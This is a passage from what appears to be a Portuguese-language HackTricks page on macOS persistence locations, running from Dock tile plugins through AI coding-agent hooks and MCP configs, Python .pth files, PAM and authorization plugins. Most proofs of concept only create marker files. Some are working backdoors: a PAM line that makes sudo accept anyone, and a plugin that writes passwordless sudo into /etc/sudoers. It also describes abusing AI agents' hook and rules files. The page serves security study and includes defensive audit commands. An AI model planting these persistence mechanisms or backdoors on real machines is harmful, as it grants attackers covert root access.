No macOS 26.5.2, a inspeção somente de leitura com `codesign` confirmou a assinatura e os entitlements da Apple do helper, e vários apps instalados declaravam `NSDockTilePlugIn`. Nenhum plugin novo foi instalado ou carregado nesse Mac, portanto a execução de um bundle recém-escrito nessa versão continua sem ter sido testada.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Write-up: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
  - A extensão do widget é executada em seu **próprio processo**, e adicionar um widget **não** gera um alerta de Background Task Management
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)
  - O plist de configuração fica dentro de um contêiner protegido por TCC, então editá-lo de fora exige Full Disk Access ou um bypass de TCC

#### Localização

- Bundle da extensão do widget: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Widgets ativos/registrados: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (chaves `widgets.instances` e `widgets.widgets`)

#### Descrição e exploração

Uma extensão do WidgetKit incluída em um app é executada em **seu próprio processo**, gerenciado pelo Notification Center. Registrar uma instância em `widgets.instances` (um blob `CHSWidget` codificado em base64 com `NSKeyedArchiver` e dados `INIntent` incorporados) e reiniciar o NotificationCenter faz com que o widget seja carregado e execute seu código `TimelineProvider`/intent.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Regras do Mail.app (Executar AppleScript)

Artigo: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Mas o Mail.app precisa estar configurado com uma conta e em execução; o gatilho é um e-mail recebido
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Editar as regras/scripts fora do Mail pode exigir que o Mail esteja fechado e que o Acesso Total ao Disco esteja habilitado nas versões modernas do macOS

#### Localização

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (regras locais; `V10` no Sonoma/Sequoia, `V11`+ nas versões mais recentes)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (regras sincronizadas com o iCloud, têm precedência)
- Ativação das regras: **`RulesActiveState.plist`**; payload do AppleScript: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Descrição e exploração

Uma **regra** do Apple Mail pode ter uma ação *"Executar AppleScript"*. Ao adicionar uma regra que corresponda a uma **linha de assunto** criada para esse fim e execute um script do atacante, o adversário obtém execução de código **remota e furtiva** no contexto do Mail sempre que o e-mail mágico chega — um vetor que escapa de muitos scanners de persistência porque nenhum LaunchAgent/Login Item é criado.<sup>[[42]](#references)</sup> Configurar a regra para também **excluir** o e-mail-gatilho oculta as evidências. Os defensores podem procurá-la diretamente:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Perfis de configuração (.mobileconfig)

Relato: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Útil para contornar o sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - O macOS moderno exige **aprovação manual do usuário** em Ajustes do Sistema → *Gerenciamento de Dispositivos* (a instalação silenciosa com `profiles install` não está mais disponível fora do MDM)
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- Os perfis instalados ficam em **`/Library/Managed Preferences/`** e **`/var/db/ConfigurationProfiles/`**; um perfil é um plist XML com um array `PayloadContent`.

#### Descrição e exploração

Um `.mobileconfig` não é um primitivo de execução de código direto, mas pode persistir configurações como uma **CA raiz confiável** (`com.apple.security.root`), um **proxy global ou PAC** (`com.apple.proxy.*`), **preferências gerenciadas** (`com.apple.ManagedClient.preferences`) ou restrições. No macOS 10.15 e versões posteriores, a definição da Apple para [`PayloadRemovalDisallowed`](https://developer.apple.com/documentation/devicemanagement/toplevel) diz que definir esse valor como `true` em um perfil **instalado manualmente**, sem um payload de senha de remoção, exige **autenticação de administrador** para removê-lo; isso não torna o perfil absolutamente impossível de remover. Perfis instalados pelo MDM têm regras próprias de gerenciamento e remoção.<sup>[[44]](#references)</sup>

> [!WARNING]
> Um perfil de configuração comum **não tem um tipo de payload que instale um `LaunchDaemon`/`LaunchAgent` arbitrário**. Instalar um daemon dessa forma exige **inscrição completa no MDM** e um agente/script de gerenciamento — não trate `.mobileconfig` como um mecanismo de entrega do launchd.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### Persistência com DYLD_INSERT_LIBRARIES

- Útil para contornar o sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **remove** `DYLD_*` de binários SIP/de plataforma, apps com hardened runtime e alvos setuid, então só injeta em processos desprotegidos e **não** contorna o SIP/o hardened runtime
- Contorno do TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- Forma confiável: o dicionário **`EnvironmentVariables`** dentro de um plist malicioso de `LaunchAgent`/`LaunchDaemon` (executado no login/boot)
- Obsoleto/histórico (apenas para referência): **`~/.MacOSX/environment.plist`** (removido na versão 10.8) e **`/etc/launchd.conf`** (removido na versão 10.10)

#### Descrição e exploração

Se um invasor conseguir inserir `DYLD_INSERT_LIBRARIES` no ambiente de um processo vítima, dyld carrega a dylib do invasor (seu construtor é executado) nesse processo. A variante persistente incorpora a variável em um LaunchAgent, para que cada inicialização da tarefa faça a injeção novamente. Observe que `launchctl setenv DYLD_*` é filtrado nas versões modernas do macOS, então incorpore a variável no plist.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Para conhecer todos os detalhes de dylib injection/hijacking, consulte:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### CLIs de agentes de codificação por IA (hooks, servidores MCP, arquivos de regras)

Artigos: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Backdoor em arquivo de regras (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Exige que o desenvolvedor use o agente correspondente. Os comandos de inicialização são executados com os privilégios desse usuário quando o agente aceita a configuração; a confiança no workspace e a aprovação de MCP variam conforme o produto e o modo da sessão.
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle) (é executado como o usuário; herda tudo o que o terminal/agente já tem)

#### Localização

Os arquivos explícitos de configuração de hooks e MCP podem fazer com que **comandos shell ou processos filhos sejam executados quando o desenvolvedor usa a ferramenta** — seja a partir de um arquivo global por usuário (persistência) ou de um arquivo incluído em um repositório (supply chain). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` e as regras do editor são **instruções para um agente**, não garantem a execução de shell ao serem lidos; seu efeito depende do comportamento do agente e das permissões das ferramentas. Verifique as regras atuais de confiança e aprovação de cada produto.

- **Claude Code**
  - `~/.claude/settings.json`, o arquivo `.claude/settings.json` do projeto, `.claude/settings.local.json` e o arquivo **`/Library/Application Support/ClaudeCode/managed-settings.json`**, acessível apenas ao root (as configurações gerenciadas/MDM **não podem ser substituídas** pelo usuário → persistência forte)
  - Objeto `hooks` — eventos `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — cada um executa um `command` de shell
  - `statusLine.command` — um comando de shell executado para renderizar a linha de status (em todas as sessões)
  - Servidores MCP em `~/.claude.json` / `.mcp.json` do projeto — `command`+`args` iniciados como processos filhos
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — instruções que podem tentar fazer prompt injection, sujeitas ao comportamento do agente e às permissões das ferramentas
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` iniciados como processos filhos); instruções do projeto em `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, servidores MCP); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … executam comandos); `.cursor/rules/`, `.cursorrules`, instruções do GitHub Copilot em `.github/copilot-instructions.md`

#### Descrição e exploração

Se um ator puder modificar as configurações globais do usuário da conta, os comandos de hooks ou MCP podem ser executados em sessões futuras nessa conta. Uma configuração controlada pelo repositório é um caso distinto: [a documentação de segurança atual do Claude Code](https://code.claude.com/docs/en/security) descreve uma caixa de diálogo interativa de confiança no workspace e uma solicitação de aprovação separada para servidores `.mcp.json` do projeto. [A matriz de permissões](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) informa que os hooks podem ser executados depois que uma pasta pai foi considerada confiável, e que as sessões `claude -p`/SDK não exibem a solicitação interativa de confiança; nesses modos não interativos, os servidores MCP do projeto se conectam sem uma solicitação de aprovação. O bypass de hook de projeto antes da confiança, relatado como CVE-2025-59536, foi [corrigido em 2025](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); não o considere um comportamento padrão atual. Os vetores de entrega podem incluir um repositório comprometido ou um instalador malicioso. Prompt injection por arquivo de regras é menos determinístico do que um hook explícito e ainda depende das aprovações das ferramentas.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Exemplo de configurações globais do usuário no Claude Code; use-as apenas em uma conta descartável durante os testes:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Exemplo de configuração MCP global do usuário do Codex:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Exemplo de configuração de hook do Cursor; verifique o esquema da versão instalada antes de usá-la:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Extensões do navegador (Chromium: Chrome / Brave / Edge)

Writeup: [Extensões externas do Chrome](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [Abuso de ExtensionInstallForcelist no macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Requer um navegador compatível e uma extensão instalada e ativada. Extensões externas no macOS exigem confirmação do usuário; a instalação forçada gerenciada requer uma política empresarial aplicável.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Isso é diferente dos **hosts de native messaging** (veja acima a seção *Chrome native messaging hosts*). Aqui, a persistência é a própria **extensão instalada automaticamente**.

#### Localização

- **JSON de extensões externas** (detectado na inicialização do navegador e, em seguida, sujeito a um prompt de ativação no macOS):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (por usuário) ou `/Library/Application Support/Google/Chrome/External Extensions/` (todos os usuários)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Instalação forçada por política empresarial** via preferências gerenciadas / perfil de configuração:
  - chave `ExtensionInstallForcelist` de `com.google.Chrome` (`com.brave.Browser` para Brave, `com.microsoft.Edge` para Edge), lida de `/Library/Managed Preferences/` ou de um `.mobileconfig` instalado

#### Descrição e exploração

Essas são duas rotas de instalação diferentes. A [documentação de instalação externa do Chrome](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) informa que usuários do **Windows e macOS precisam confirmar e ativar** uma extensão oferecida por meio de um arquivo *External Extensions*; ela não é executada simplesmente porque esse arquivo JSON foi gravado. Para instalação para todos os usuários no macOS, o Chrome também exige que o arquivo de extensão externa esteja protegido contra modificações por usuários sem privilégios. Uma política gerenciada `ExtensionInstallForcelist` ou `ExtensionSettings` pode instalar e fixar uma extensão sem essa interação do usuário; o [guia de políticas do Google para Mac](https://support.google.com/chrome/a/answer/7517624) descreve a configuração gerenciada e informa que as extensões instaladas à força não podem ser removidas pelo usuário. Esse é um método de implantação por política, não um atalho de `defaults write` por usuário.<sup>[[49]](#references)</sup>

> [!WARNING]
> No macOS, um manifesto JSON de *External Extensions* precisa apontar para um URL de atualização da **Chrome Web Store**, não para um CRX local. A implantação por política gerenciada tem seus próprios pré-requisitos empresariais e pode permitir um URL de atualização gerenciado e auto-hospedado. Para uma extensão local não empacotada em um perfil de teste, a opção `--load-extension=/path` do modo de desenvolvedor do Chrome é um mecanismo separado e não faz com que um arquivo JSON de External Extensions seja executado automaticamente. Não trate uma gravação em `Secure Preferences` como equivalente a qualquer uma das rotas de registro documentadas.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Inicie o Chrome nessa conta descartável e observe o aviso de ativação; o próprio comportamento da extensão é o PoC de execução depois que o usuário aceita. Após o teste, remova o manifest e desative/desinstale a extensão nesse perfil. Esse caminho **não** foi testado no perfil ativo do Chrome no Mac de pesquisa. A rota de política gerenciada também não foi implantada nele.

Force-install e External Extensions fazem referência a IDs de extensões da **Chrome Web Store**; para o truque de nível mais baixo de injetar silenciosamente uma extensão local editando as `Secure Preferences` do perfil, assinadas com HMAC, e outros abusos de processos do Chromium, consulte:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### Esquemas de URL e handlers de tipos de arquivo (LaunchServices)

Relato: [Remote Mac Exploitation Via Custom URL Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
  - O gatilho é a vítima clicar em um link (por exemplo, no Chrome/Brave/Safari) ou abrir um arquivo do tipo registrado
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- Um app bundle com `Info.plist` que declara **`CFBundleURLTypes`/`CFBundleURLSchemes`** (esquema de URL personalizado) ou **`CFBundleDocumentTypes`** (extensão de arquivo/UTI)
- Os padrões efetivos por usuário podem aparecer em **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (array `LSHandlers`). A API compatível com a Apple para escolher um handler padrão de esquema de URL é `LSSetDefaultHandlerForURLScheme`; gravar diretamente nesse plist não é um método documentado de registro nem de atualização do cache.

#### Descrição e exploração

O Launch Services obtém as declarações de esquemas de URL e documentos do `Info.plist` de um app registrado. O [guia de registro da Apple](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) diz que o registro pode ocorrer quando o Finder descobre o app, na inicialização ou no login, ou por meio de uma API explícita de registro; simplesmente gravar um app em algum local não garante um acionamento imediato. Após o registro, abrir uma URL ou documento correspondente pode iniciar o app handler selecionado, sujeito à escolha do usuário para o handler padrão e às verificações normais de inicialização do macOS. A API compatível `LSSetDefaultHandlerForURLScheme` altera um handler de URL preferido pelo usuário; ela não faz com que um app recém-adicionado seja executado automaticamente.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Nenhum app foi registrado e nenhuma preferência de handler foi alterada no Mac de pesquisa com macOS 26.5.2. Para testar um handler real, use uma conta de usuário descartável, registre um app que apenas crie um marcador com um scheme exclusivo, invoque sua URL e, em seguida, remova o app e seu registro.

Para enumerar/abusar de handlers de extensão de arquivo e de URL scheme em profundidade, consulte:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Arquivos de inicialização do Python (`.pth` / `usercustomize` / `sitecustomize`)

Writeup: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
  - É executado quando o interpretador Python relevante é iniciado com esse diretório de site habilitado; o trigger não é universal entre ambientes virtuais, builds do Python ou flags de inicialização
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)
  - É executado com os privilégios/TCC do processo que iniciou o interpretador

#### Localização

- **`$(python3 -m site --user-site)/*.pth`** (builds do macOS framework: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Não requer root (gravável pelo usuário)
  - **Trigger**: inicialização desse build do Python com o user site habilitado; o módulo `site` processa arquivos `.pth` nos diretórios de site ativos
- **`<user-site>/usercustomize.py`**
  - Não requer root
  - **Trigger**: inicialização com o user site habilitado (importado automaticamente por `site`)
- **`<prefix>/site-packages/sitecustomize.py`** (por exemplo, `/opt/homebrew/lib/python3.13/site-packages/` ou caminhos do sistema)
  - Root/admin pode ser necessário, dependendo da localização do interpretador
  - **Trigger**: inicialização de um interpretador que inclua esse diretório de site

#### Descrição e exploração

Na inicialização, o Python normalmente importa `site` e examina os diretórios `site-packages` ativos em busca de arquivos `.pth`. Além de adicionar caminhos, uma linha `.pth` que começa com `import ` executa código Python, mesmo que o módulo indicado nunca seja usado de outra forma. O Python também tenta importar `sitecustomize` e, **quando o user site está habilitado**, `usercustomize`.<sup>[[56]](#references)</sup> O trigger é uma inicialização posterior de um interpretador que detecte o diretório modificado. `-S` desabilita o processamento de `site`; `-s`, `-I` ou `PYTHONNOUSERSITE` desabilitam as variantes de **user site**. Em geral, `-I` não desabilita um `sitecustomize` global. Ambientes virtuais também podem excluir o user site. Verifique `python3 -m site` para o interpretador específico.

O PoC a seguir foi executado no macOS 26.5.2. `PYTHONUSERBASE` direciona o user site para um diretório temporário para este teste; nenhum user site real é modificado:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Both os marcadores apareceram. Repetir com `-s`, `-I` ou `-S` impediu ambos os marcadores de **user-site** neste teste. `sitecustomize` em um diretório global de site não foi testado.

## Bypass de sandbox como root

> [!TIP]
> Aqui você pode encontrar locais de inicialização úteis para **bypass de sandbox**, que permitem simplesmente executar algo **gravando-o em um arquivo**, sendo **root** e/ou exigindo outras **condições incomuns**.

### Periodic

> [!CAUTION]
> **Mecanismo histórico:** Na máquina de teste com macOS 26.5.2, `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` e os launch daemons `com.apple.periodic-*` não estão presentes. Não presuma que criar `/etc/periodic` em um sistema atual agendará a execução do seu conteúdo. Verifique se o comando existe e se há um agendador habilitado na versão de destino antes de usar o exemplo abaixo.

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Útil para bypass de sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Mas você precisa ser root
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Requer root
  - **Acionamento**: Quando chegar a hora
- `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`
  - Requer root
  - **Acionamento**: Quando chegar a hora

#### Descrição e exploração

Em versões mais antigas, os scripts periodic (**`/etc/periodic`**) eram agendados por **launch daemons** em `/System/Library/LaunchDaemons/com.apple.periodic*`. A partir do macOS Big Sur 11.5, o executor de periodic executava os scripts nos diretórios periodic como o **proprietário de cada arquivo**, encerrando uma antiga via de escalonamento de privilégios.<sup>[[27]](#references)</sup> Os comandos e listagens de diretórios abaixo são resultados históricos, não resultados de um teste no macOS 26.5.2.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Há outros scripts periódicos cuja execução é indicada em **`/etc/defaults/periodic.conf`**:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

Em sistemas mais antigos, com `periodic` e seus launch daemons instalados e habilitados, `/etc/daily.local`, `/etc/weekly.local` e `/etc/monthly.local` eram caminhos adicionais de execução. Uma verificação inofensiva, somente de leitura, é:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> A regra baseada no proprietário era aplicada a scripts diretamente nos diretórios periódicos. O wrapper histórico `999.local` costumava executar `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local` sem essa mesma verificação de propriedade; quando o agendador era executado como root, esses arquivos locais eram executados como root. Essa distinção e a mudança no Big Sur 11.5 estão documentadas na [pesquisa original](https://theevilbit.github.io/beyond/beyond_0019/). Não se deve presumir que nenhum desses caminhos esteja ativo quando `periodic` estiver ausente.

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Útil para bypass do sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Mas você precisa ser root
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- Root sempre necessário

#### Descrição e exploração

Como o PAM é mais voltado à **persistência** e a malware do que à execução fácil dentro do macOS, este blog não dará uma explicação detalhada; **leia os writeups para entender melhor esta técnica**.<sup>[[28]](#references)</sup>

Verifique os módulos PAM com:

```bash
ls -l /etc/pam.d
```

Uma técnica de persistência/elevação de privilégios que abusa do PAM é tão simples quanto modificar o módulo /etc/pam.d/sudo, adicionando a seguinte linha no início:

```bash
auth       sufficient     pam_permit.so
```

Então, vai **parecer** algo como isto:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

E, portanto, qualquer tentativa de usar **`sudo` funcionará**.

> [!CAUTION]
> Observe que este diretório é protegido pelo TCC, então é muito provável que o usuário receba uma solicitação de acesso.

Outro bom exemplo é o su, em que você pode ver que também é possível passar parâmetros para os módulos PAM (e você também poderia instalar um backdoor neste arquivo):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Plugins de autorização

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Útil para bypass do sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Mas você precisa ser root e fazer configurações adicionais
- TCC bypass: ???

#### Localização

- `/Library/Security/SecurityAgentPlugins/`
  - É necessário ter root
  - Também é necessário configurar o banco de dados de autorização para usar o plugin

#### Descrição e exploração

Você pode criar um plugin de autorização que será executado quando um usuário iniciar sessão para manter a persistence. Para mais informações sobre como criar um desses plugins, consulte os writeups anteriores (e tome cuidado: um plugin mal escrito pode impedir seu acesso, e você precisará limpar seu Mac pelo modo de recuperação).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Mova** o bundle para o local onde será carregado:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Por fim, adicione a **regra** para carregar este Plugin:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

O **`evaluate-mechanisms`** informará a estrutura de autorização de que será necessário **chamar um mecanismo externo para autorização**. Além disso, **`privileged`** fará com que ele seja executado pelo root.

Acione-o com:

```bash
security authorize com.asdf.asdf
```

E então o grupo **staff** deve ter acesso ao sudo (leia `/etc/sudoers` para confirmar).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Útil para bypass de sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Mas você precisa ser root e o usuário precisa usar man
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- **`/private/etc/man.conf`**
  - Requer root
  - **`/private/etc/man.conf`**: Sempre que man é usado

#### Descrição e exploração

